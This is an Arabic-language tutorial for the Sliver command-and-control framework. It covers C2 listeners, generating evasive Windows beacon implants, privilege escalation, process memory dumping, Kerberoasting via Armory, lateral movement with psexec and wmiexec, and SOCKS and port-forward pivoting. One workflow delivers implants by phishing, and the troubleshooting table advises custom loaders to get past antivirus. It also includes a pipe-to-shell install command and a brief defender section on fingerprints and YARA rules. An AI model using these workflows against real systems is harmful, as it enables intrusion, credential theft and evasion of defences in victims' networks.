# Sliver — الدليل الكامل (Full Tutorial)

Sliver هو إطار عمل مفتوح المصدر ومتحور لمنظومات القيادة والسيطرة (C2) الحديثة. تم تطويره بلغة Go (يصدر كملف ثنائي واحد، ويدعم التصريف المتقاطع Cross-compile لكافة المنصات)، ويدعم بروتوكولات متعددة تشمل HTTP/HTTPS و mTLS و DNS و WireGuard و MTLS عبر الأنابيب المnamed pipes. يتولى فريق Bishop Fox صيانة هذا المشروع بشكل أساسي.

## التثبيت (Install)

```terminal
curl https://sliver.sh/install | sudo bash
sliver-server daemon &
sliver
```

يمكن للمشغل (Operator) الاتصال عبر استيراد ملف الإعدادات:

```terminal
sliver-server operator -n op1 --lhost team.internal --save op1.cfg
sliver-client import op1.cfg
sliver-client
```

## أدوات التنصت (Listeners)

```
sliver > https --lhost 0.0.0.0 --lport 443 --domain c2.example.com
sliver > http  --lhost 0.0.0.0 --lport 80
sliver > mtls  --lport 8443
sliver > dns   --domains a.example.com b.example.com
sliver > wg    --lport 53
```

يعتبر `mtls` (بروتوكول TLS المتبادل) وسيلة اتصال خفية للغاية، حيث يتطلب مصادقة ثنائية، ويكون فعالاً جداً عند استخدامه خلف شبكات توصيل المحتوى (CDN).

## توليد البرمجيات المغروسة (Implant Generation)

```
sliver > generate beacon \
    --http "https://c2.example.com" \
    --jitter 30 --seconds 60 \
    --os windows --arch amd64 \
    --format exe --save /tmp/agent.exe \
    --evasion --skip-symbols
```

الصيغ المدعومة: `exe`, `shared` (DLL), `service`, `shellcode`, `elf`, `macho`. يدعم التوليد تشفير المراحل (Stage encryption) واستخدام مكتبات DLL الانعكاسية (Reflective DLL).

## الجلسات مقابل المنارات (Sessions vs Beacons)

| النوع | نموذج الشبكة |
|------|---------------|
| **Session** | اتصال مستمر — تفاعلية فورية ولكن يسهل كشفها |
| **Beacon** | تواصل دوري (Check-in) — خفي، أبطأ في التنفيذ |

```
sliver > sessions
sliver > beacons
sliver > use <id>
sliver (TARGET) > getuid
sliver (TARGET) > info
```

## أوامر المشغل داخل الغرسة (Operator Commands)

| الأمر | التأثير |
|---------|--------|
| `getuid / whoami` | تحديد الهوية |
| `pwd / cd / ls / cat` | التعامل مع نظام الملفات (FS) |
| `download / upload` | نقل الملفات |
| `shell` | تشغيل صدفة (cmd/PowerShell/bash) |
| `execute / execute-assembly` | تنفيذ ملفات EXE أو .NET assembly في الذاكرة |
| `procdump <pid>` | سحب ذاكرة العمليات (Dump process memory) |
| `getsystem` | رفع الصلاحيات إلى SYSTEM عبر الـ Token |
| `impersonate / make-token` | انتحال هوية الـ Token |
| `migrate <pid>` | الانتقال إلى عملية أخرى (Migration) |
| `psexec / wmiexec / dcomexec` | التحرك الجانبي (Lateral movement) |
| `portfwd / rportfwd` | إعادة توجيه المنافذ (Port forwarding) |
| `socks5 start` | تفعيل بروكسي SOCKS5 عبر الغرسة |
| `armory` | متجر الإضافات (BOFs, .NET tools) |
| `jobs` | تتبع أدوات التنصت والمعالجة (Listeners/Handlers) |

## متجر Armory — الإضافات والملحقات

```
sliver > armory install
sliver > armory install certify
sliver > armory install rubeus
sliver > certify find -vulnerable
sliver > rubeus -- kerberoast
```

يستضيف Armory مجموعة مختارة من الـ BOFs و .NET assemblies التي تم دمجها لتعمل كأوامر مباشرة داخل Sliver.

## ملفات التعريف وأدوات التحميل (Profiles & Stagers)

```
sliver > profiles new beacon \
    --http "https://c2.example.com" --os windows --arch amd64 \
    --jitter 60 --seconds 300 --debug-file=false stealth-https
sliver > stager --listener-url tcp://0.0.0.0:8443 --output stager.bin --format raw
```

ينتج الـ Stager كوداً برمجياً (Shellcode) يمكن تغليفه داخل محمل (Loader) مثل Donut مع مشفر مخصص.

## سير العمل (Workflows)

### إعداد منارة HTTPS متكاملة

```
sliver > https --domain c2.example.com --lhost 0.0.0.0 --lport 443 \
    --letsencrypt --persistent
sliver > generate beacon --http https://c2.example.com --jitter 25 --seconds 60 \
    --os windows --arch amd64 --format exe --save beacon.exe --evasion
# يتم تسليم beacon.exe عبر سلسلة هجوم التصيد الاحتيالي (Phishing).
sliver > beacons
sliver > use 0
sliver (BEACON) > tasks
```

### التحرك الجانبي (Lateral Movement)

```
sliver (B1) > psexec --hostname FILESRV --service-name update --service-description "Updates"  beacon-x64.exe
sliver (B1) > wmiexec --hostname WEB01 --command "powershell -ec ..."
```

### بروكسي SOCKS لاستخدام أدوات خارجية

```
sliver (B) > socks5 start
# من طرف المشغل: proxychains4 nmap -sT -Pn 10.0.0.0/24
```

### توجيه منفذ RDP عبر المنارة

```
sliver (B) > portfwd add --bind 127.0.0.1:13389 --remote 10.0.0.5:3389
# من طرف المشغل: xfreerdp /v:127.0.0.1:13389 ...
```

## استكشاف الأخطاء وإصلاحها (Troubleshooting)

| العرض | السبب المحتمل | الحل |
|---------|-------|-----|
| المنارة لا تتصل مطلقاً | مشكلة في الخروج من الشبكة (Egress) أو TLS | اختبر الاتصال بـ `curl https://c2.example.com` من الضحية؛ تحقق من سجلات الـ Redirector |
| اكتشاف بناء `--evasion` بواسطة مكافح الفيروسات | توقيعات Shellcode الافتراضية لـ Sliver | استخدم محمل مخصص (مثل Donut أو ScareCrow)؛ أو نسخة خاصة (Private Fork) |
| فشل Letsencrypt | منفذ 80 غير متاح لتحدي HTTP-01 | استخدم تحدي DNS-01 أو قم بإصدار الشهادة مسبقاً |
| انهيار المنارة عند تشغيل BOF | عدم توافق في واجهة برمجة التطبيقات (API) | استخدم نسخة Sliver المتوافقة؛ أعد بناء الـ BOF باستخدام SDK الحالي |

## منظور المدافع (Defender's Perspective)

- يمكن بصم (Fingerprint) اتصالات HTTPS الافتراضية لـ Sliver عبر JA3 / JA3S الموثقة.
- روابط المنارات الافتراضية (مسارات عشوائية بصيغة GUID) — مميزة جداً ما لم يتم تغيير ملف التعريف.
- البرمجيات المغروسة التي تستخدم `garble` (الافتراضية في `--evasion`) تترك سلاسل نصية خاصة ببيئة Go — توجد قواعد Yara لكشفها مثل `malware-yara/sliver_implant.yar`.

نقاط القوة في الكشف:
- أنظمة EDR المعتمدة على ETW يمكنها رصد التحميل الانعكاسي (Reflective Loading) ورموز بيئة Go.
- شذوذ الشبكة: اتصال TLS بشهادة Let's Encrypt مع نطاق مسجل حديثاً.

## أمن العمليات (OPSEC)

- قم بتوليد غرسات مخصصة لكل عملية؛ يقوم Sliver بتضمين معرف بناء (Build ID) يربط بين الملفات الثنائية لنفس العملية.
- استخدم Armory بحذر؛ فكل ملف BOF تستورده يحمل توقيعاته الخاصة.
- احتفظ بملفات إعدادات المشغل في وحدات تخزين مشفرة؛ فهي تمنح وصولاً كاملاً لخادم الفريق.
- استبدل Shellcode الافتراضي لـ Sliver بمحمل مخصص عند استهداف بيئات تحتوي على أنظمة EDR متطورة.

## أدوات ذات صلة

- **Cobalt Strike** — البديل التجاري الأشهر.
- **Mythic** — إطار عمل مفتوح المصدر يتميز بالوحدات النمطية (Modular).
- **Havoc** — إطار عمل حديث قابل للبرمجة بلغة Yaegi.
- **Brute Ratel** — أداة تجارية تركز على تقليل التوقيعات.
- **Merlin** — أطار عمل C2 مفتوح المصدر يعتمد على HTTP/2.
